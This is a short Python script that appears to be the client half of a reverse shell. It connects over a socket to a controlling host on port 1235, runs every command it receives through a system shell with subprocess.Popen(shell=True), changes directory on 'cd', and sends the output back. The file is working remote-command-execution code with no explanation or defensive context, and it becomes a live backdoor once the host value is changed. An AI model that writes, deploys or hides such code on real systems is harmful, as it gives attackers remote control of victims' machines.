import socket
import os, subprocess

# Create a Socket (Connection between 2 computers)
def create_socket():
    try:
        global host
        global port
        global c
        c = socket.socket()
        port = 1235
        host = socket.gethostname()
    except socket.error as msg:
        print('Socket creation error: ' + str(msg))

def bind_socket():
    try:
        global host
        global port
        global c
        c.connect((host,port))
    except socket.error as msg:
        print('Socket connection error: ' + str(msg))

if __name__ == '__main__':
    create_socket()
    bind_socket()

    while True:
        global host
        global port
        global c
        data = c.recv(1024)
        if data[:].decode('utf-8') == 'quit':
            break
        if data[:2].decode('utf-8') == 'cd':
            os.chdir(data[3:].decode('utf-8'))

        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte, 'utf-8')
            currentwd = os.getcwd() + '> '

            c.send(str.encode(currentwd + output_str))
            print(output_str)